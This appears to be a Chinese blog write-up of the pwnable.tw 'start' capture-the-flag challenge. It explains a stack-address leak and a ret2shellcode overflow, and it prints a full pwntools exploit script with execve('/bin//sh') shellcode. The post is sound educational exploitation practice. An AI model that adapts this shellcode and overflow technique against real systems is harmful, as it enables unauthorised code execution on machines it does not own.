---
title: "PWNable刷刷题"
image: ''
pinned: false
comment: true
published: 2026-06-01
updated: 2026-06-01
description: "pwn"
category: PWN
tags: [PWN]
---

![image-20260601210213834](/images/image-20260601210213834.png)

# 1.start

这题简单是就是 `ret2shellcode` ，但是又有陷阱点，直接 `ida` 反编译的结果中，你是看不到其他信息的。

![image-20260601210416785](/images/image-20260601210416785.png)

一个开始函数，一个退出函数，直接看的话，就是看见输入什么，然后就退出去了。

但是实际运行，是明显可以看见读取输入的逻辑的。

![image-20260601210553751](/images/image-20260601210553751.png)

仔细看汇编代码，便能看见四个 `push` 的指令。

![image-20260601211002280](/images/image-20260601211002280.png)

通过分析程序，可以看到由于小端序的缘故。

```
push 0x3a465443   ; "CTF:"
push 0x20656874   ; "the "
push 0x20747261   ; "art "
push 0x74732073   ; "s st"
push 0x2774654c   ; "Let'"
```

倒着转化，得到以上内容。

![image-20260601211115724](/images/image-20260601211115724.png)

`gdb` 里面也可以看到。



![image-20260601211221929](/images/image-20260601211221929.png)

最关键的逻辑在这里。

```
08048087: mov ecx, esp
08048089: mov dl, 0x14
0804808b: mov bl, 0x1
0804808d: mov al, 0x4
0804808f: int 0x80        ; write(1, esp, 20)

08048091: xor ebx, ebx
08048093: mov dl, 0x3c
08048095: mov al, 0x3
08048097: int 0x80        ; read(0, esp, 60)

08048099: add esp, 0x14
0804809c: ret
```

一个是write函数的汇编，一个是read函数的汇编。

有了这两个，我们就可以利用栈溢出往栈上面写入我们需要的数据，然后进行返回地址的泄露。

两次输入。

## 1.输入`b"A" * 20 + p32(0x08048087)`

覆盖返回地址调用write，写出栈的位置。

```
leak = io.recvn(20)
stack = u32(leak[:4])
```

## 2.输入`b"A" * 20 + p32(stack + 0x14) + shellcode`



### exp：

```
from pwn import *

context(log_level='debug', arch='i386', os='linux')

io = process('./start')
# io = remote('chall.pwnable.tw', 10000)

shellcode_asm = '''
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al,0xb
int 0x80
'''

shellcode = asm(shellcode_asm)
print(len(shellcode))

io.recvuntil(b"CTF:")

payload1 = b"A" * 20 + p32(0x08048087)
io.send(payload1)

leak = io.recvn(20)
stack = u32(leak[:4])

log.info("stack: " + hex(stack))

payload2 = b"A" * 20 + p32(stack + 0x14) + shellcode
io.send(payload2)

io.interactive()
```

其实整个难理解，或者说对于payload，我存在问题的是，第二次输入的时候栈要 `+0x14` ，最主要的原因其实，是在第一次push的时候，esp也就是栈减了4，然后我们的数据才读取进入，

![image-20260601213744277](/images/image-20260601213744277.png)

这边，说实话，真正手操的时候，我觉得我还是没办法这么直接操作。

因为纯汇编的缘故，我看不懂。

但是有个方法，就是纯动态调试。











---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
